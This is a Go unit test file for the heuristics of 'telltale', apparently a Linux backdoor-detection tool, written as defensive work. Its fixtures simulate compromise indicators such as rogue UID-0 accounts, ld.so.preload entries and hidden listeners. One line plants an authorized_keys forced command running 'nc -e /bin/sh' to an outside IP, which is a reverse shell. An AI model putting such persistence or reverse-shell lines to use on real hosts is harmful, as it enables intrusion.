package heuristics

import (
	"strings"
	"testing"

	"github.com/donaldsteele/telltale/internal/model"
)

const serverBlob = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIserverserverserverserverserverserverserver"

func cleanCollection() *model.Collection {
	return &model.Collection{
		Accounts: model.Accounts{Users: []model.User{
			{Name: "root", UID: 0, Shell: "/bin/bash", Password: model.PasswordState{Set: true}},
			{Name: "daemon", UID: 1, Shell: "/usr/sbin/nologin", Password: model.PasswordState{Locked: true}},
			{Name: "alice", UID: 1000, Shell: "/bin/bash", Password: model.PasswordState{Set: true}},
			{Name: "+", UID: 0, Shell: ""},
			{Name: "-@x", UID: 0, Shell: "/bin/sh"},
		}},
		Files: []model.FileEntry{
			{Path: "/usr/bin/sudo", Type: "file", Mode: 0o104755},
			{Path: "/etc/passwd", Type: "file", Mode: 0o100644},
		},
		Persist: []model.PersistFile{
			{Path: "/etc/ld.so.preload", Kind: model.PersistKindLDPreload, Lines: nil},
			{Path: "/root/.ssh/authorized_keys", Kind: model.PersistKindAuthorizedKeys,
				Lines: []string{"# c", "from=\"10.0.0.1\" " + serverBlob + " telltale"}},
			{Path: "/etc/systemd/system/foo.service", Kind: model.PersistKindSystemdUnit, Mode: 0o120777, Lines: []string{"/usr/lib/systemd/system/foo.service"}},
			{Path: "/etc/systemd/system/other.service", Kind: model.PersistKindSystemdUnit, Mode: 0o120777, Lines: []string{"/dev/null"}},
		},
		Runtime: model.Runtime{
			Processes: []model.Process{
				{PID: 1, UID: 0, Exe: "/usr/lib/systemd/systemd", Cmdline: "init"},
				{PID: 5, UID: -1},
			},
			Sockets: []model.Socket{{Proto: "tcp", Local: "0.0.0.0:22", Listening: true, PID: 1}},
			Modules: []model.KernelModule{{Name: "ext4", File: "/lib/modules/x/ext4.ko"}},
		},
		CrossView: []model.CrossViewResult{
			{Tool: "ps", Ran: true},
			{Tool: "lsmod", Ran: false, HiddenFromTool: []string{"x"}},
		},
	}
}

func cleanOwned() map[string]string {
	return map[string]string{
		"/usr/bin/sudo":            "sudo",
		"/usr/lib/systemd/systemd": "systemd",
		"/lib/modules/x/ext4.ko":   "linux",
	}
}

var ctx = model.ScanContext{ServerKeyLine: serverBlob + " telltale"}

func find(fs []model.Finding, key string) *model.Finding {
	for i := range fs {
		if fs[i].Key == key {
			return &fs[i]
		}
	}
	return nil
}

func keys(fs []model.Finding) []string {
	var k []string
	for _, f := range fs {
		k = append(k, f.Key)
	}
	return k
}

func want(t *testing.T, c *model.Collection, key string, sev model.Severity) model.Finding {
	t.Helper()
	fs := Run(c, ctx, cleanOwned())
	f := find(fs, key)
	if f == nil {
		t.Fatalf("no finding %s; got %v", key, keys(fs))
	}
	if f.Severity != sev {
		t.Errorf("%s severity %v, want %v", key, f.Severity, sev)
	}
	if f.Source != "heuristic" || !strings.HasPrefix(f.ID, "TT-HEUR-") || f.Title == "" || f.Why == "" || f.Fix == "" || len(f.Refs) == 0 {
		t.Errorf("%s incomplete: %+v", key, f)
	}
	return *f
}

func TestHeuristicsCleanCollectionHasNoFindings(t *testing.T) {
	if fs := Run(cleanCollection(), ctx, cleanOwned()); len(fs) != 0 {
		t.Fatalf("findings on clean collection: %v", keys(fs))
	}
}

func TestHeuristicSecondUID0(t *testing.T) {
	c := cleanCollection()
	c.Accounts.Users = append(c.Accounts.Users, model.User{Name: "toor", UID: 0, Shell: "/bin/sh", Password: model.PasswordState{Set: true}})
	want(t, c, "heur.uid0:toor", model.SevBackdoor)
}

func TestHeuristicEmptyPassword(t *testing.T) {
	c := cleanCollection()
	c.Accounts.Users = append(c.Accounts.Users, model.User{Name: "bob", UID: 1001, Shell: "/bin/bash"})
	want(t, c, "heur.empty_password:bob", model.SevWeak)
}

func TestHeuristicSystemShell(t *testing.T) {
	c := cleanCollection()
	c.Accounts.Users = append(c.Accounts.Users, model.User{Name: "www-data", UID: 33, Shell: "/bin/bash", Password: model.PasswordState{Locked: true}})
	want(t, c, "heur.system_shell:www-data", model.SevNote)
}

func TestHeuristicLDPreload(t *testing.T) {
	c := cleanCollection()
	c.Persist[0].Lines = []string{"/tmp/evil.so"}
	f := want(t, c, "heur.ld_preload", model.SevBackdoor)
	if !strings.Contains(f.Fix, "cp -a /etc/ld.so.preload /root/telltale-evidence/") || strings.Index(f.Fix, "cp -a") > strings.Index(f.Fix, "rm ") {
		t.Errorf("fix: %s", f.Fix)
	}
}

func TestHeuristicDeletedExe(t *testing.T) {
	c := cleanCollection()
	c.Runtime.Processes = append(c.Runtime.Processes, model.Process{PID: 77, UID: 0, Exe: "/usr/bin/x", Cmdline: "x -a", ExeDeleted: true})
	f := want(t, c, "heur.proc_exe:77", model.SevBackdoor)
	if !strings.Contains(f.Fix, "kill -STOP 77") || !strings.Contains(f.Fix, "cp /proc/77/exe /root/telltale-evidence/77.exe") {
		t.Errorf("fix: %s", f.Fix)
	}
	if !strings.Contains(f.Evidence[0].Detail+f.Evidence[0].After, "x -a") {
		t.Errorf("evidence lacks cmdline: %+v", f.Evidence)
	}
}

func TestHeuristicProcExePaths(t *testing.T) {
	for _, exe := range []string{"/tmp/a", "/dev/shm/a", "/var/tmp/a", "/home/u/.cache/a", "/usr/bin/.hidden"} {
		c := cleanCollection()
		c.Runtime.Processes = append(c.Runtime.Processes, model.Process{PID: 9, UID: 1000, Exe: exe})
		want(t, c, "heur.proc_exe:9", model.SevBackdoor)
	}
}

func TestHeuristicForcedCommandIgnoresServerKey(t *testing.T) {
	c := cleanCollection()
	c.Persist[1].Lines = []string{"command=\"/usr/bin/true\",from=\"10.0.0.1\" " + serverBlob + " telltale"}
	if fs := Run(c, ctx, cleanOwned()); len(fs) != 0 {
		t.Fatalf("server key flagged: %v", keys(fs))
	}
	c.Persist[1].Lines = append(c.Persist[1].Lines,
		"command=\"nc -e /bin/sh 1.2.3.4 9\" ssh-rsa AAAAB3other me@x")
	f := want(t, c, "heur.forced_command:/root/.ssh/authorized_keys:2", model.SevBackdoor)
	if !strings.Contains(f.Fix, "telltale-evidence") {
		t.Errorf("fix: %s", f.Fix)
	}
	// forced command also a root key: only the forced-command finding
	if find(Run(c, ctx, cleanOwned()), "heur.root_key:/root/.ssh/authorized_keys:2") != nil {
		t.Error("double-reported")
	}
}

func TestHeuristicRootKey(t *testing.T) {
	c := cleanCollection()
	c.Persist[1].Lines = append(c.Persist[1].Lines, "ssh-rsa AAAAB3other me@x")
	want(t, c, "heur.root_key:/root/.ssh/authorized_keys:3", model.SevNote)
	// a non-root user's key is not a root key
	c = cleanCollection()
	c.Persist = append(c.Persist, model.PersistFile{Path: "/home/alice/.ssh/authorized_keys", Kind: model.PersistKindAuthorizedKeys, Lines: []string{"ssh-rsa AAAAB3other me@x"}})
	if fs := Run(c, ctx, cleanOwned()); len(fs) != 0 {
		t.Fatalf("got %v", keys(fs))
	}
}

func TestHeuristicUnownedSetuid(t *testing.T) {
	c := cleanCollection()
	c.Files = append(c.Files,
		model.FileEntry{Path: "/usr/bin/evil", Type: "file", Mode: 0o104755},
		model.FileEntry{Path: "/usr/local/bin/mine", Type: "file", Mode: 0o102755},
		model.FileEntry{Path: "/usr/bin/plain", Type: "file", Mode: 0o100755})
	want(t, c, "heur.unowned_setuid:/usr/bin/evil", model.SevBackdoor)
	want(t, c, "heur.unowned_setuid:/usr/local/bin/mine", model.SevNote)
	if find(Run(c, ctx, cleanOwned()), "heur.unowned_setuid:/usr/bin/plain") != nil {
		t.Error("plain file flagged")
	}
}

func TestHeuristicImmutableFlag(t *testing.T) {
	c := cleanCollection()
	c.Files = append(c.Files,
		model.FileEntry{Path: "/etc/cron.d/x", Type: "file", Flags: 0x10},
		model.FileEntry{Path: "/etc/y", Type: "file", Flags: 0x20},
		model.FileEntry{Path: "/etc/z", Type: "file", Flags: 0x80})
	f := want(t, c, "heur.immutable:/etc/cron.d/x", model.SevBackdoor)
	if !strings.Contains(f.Fix, "chattr -i /etc/cron.d/x") {
		t.Errorf("fix: %s", f.Fix)
	}
	want(t, c, "heur.immutable:/etc/y", model.SevBackdoor)
	if find(Run(c, ctx, cleanOwned()), "heur.immutable:/etc/z") != nil {
		t.Error("other flag flagged")
	}
}

func TestHeuristicUnownedModule(t *testing.T) {
	c := cleanCollection()
	c.Runtime.Modules = append(c.Runtime.Modules,
		model.KernelModule{Name: "rk"},
		model.KernelModule{Name: "dkms", File: "/lib/modules/x/extra/dkms.ko"})
	want(t, c, "heur.module:rk", model.SevBackdoor)
	want(t, c, "heur.module:dkms", model.SevBackdoor)
}

func TestHeuristicUnownedListener(t *testing.T) {
	c := cleanCollection()
	c.Runtime.Processes = append(c.Runtime.Processes, model.Process{PID: 50, UID: 1000, Exe: "/opt/app/bin/app"})
	c.Runtime.Sockets = append(c.Runtime.Sockets,
		model.Socket{Proto: "tcp", Local: "0.0.0.0:8080", Listening: true, PID: 50},
		model.Socket{Proto: "tcp", Local: "1.2.3.4:5555", Listening: false, PID: 50})
	want(t, c, "heur.unowned_listener:8080", model.SevNote)
	if find(Run(c, ctx, cleanOwned()), "heur.unowned_listener:5555") != nil {
		t.Error("non-listening flagged")
	}
}

func TestHeuristicCrossViewHidden(t *testing.T) {
	c := cleanCollection()
	c.CrossView = append(c.CrossView, model.CrossViewResult{Tool: "ss -t -4", Ran: true, HiddenFromTool: []string{"0.0.0.0:31337", "x"}})
	f := want(t, c, "heur.crossview:ss -t -4", model.SevTampering)
	if len(f.Evidence) != 2 {
		t.Errorf("evidence %v", f.Evidence)
	}
	if find(Run(c, ctx, cleanOwned()), "heur.crossview:lsmod") != nil {
		t.Error("not-run tool flagged")
	}
}

func TestHeuristicPersistLink(t *testing.T) {
	c := cleanCollection()
	c.Persist = append(c.Persist,
		model.PersistFile{Path: "/etc/systemd/system/x.service", Kind: model.PersistKindSystemdUnit, Mode: 0o120777, Lines: []string{"/var/tmp/x.service"}},
		model.PersistFile{Path: "/etc/systemd/system/rel.service", Kind: model.PersistKindSystemdUnit, Mode: 0o120777, Lines: []string{"../../../tmp/r.service"}},
		model.PersistFile{Path: "/etc/systemd/system/auditd.service", Kind: model.PersistKindSystemdUnit, Mode: 0o120777, Lines: []string{"/dev/null"}},
		model.PersistFile{Path: "/etc/systemd/system/ok.service", Kind: model.PersistKindSystemdUnit, Mode: 0o120777, Lines: []string{"../../../usr/lib/systemd/system/ok.service"}})
	want(t, c, "heur.persist_link:/etc/systemd/system/x.service", model.SevBackdoor)
	want(t, c, "heur.persist_link:/etc/systemd/system/rel.service", model.SevBackdoor)
	want(t, c, "heur.persist_link:/etc/systemd/system/auditd.service", model.SevWeak)
	fs := Run(c, ctx, cleanOwned())
	if find(fs, "heur.persist_link:/etc/systemd/system/ok.service") != nil || find(fs, "heur.persist_link:/etc/systemd/system/other.service") != nil {
		t.Errorf("benign links flagged: %v", keys(fs))
	}
}
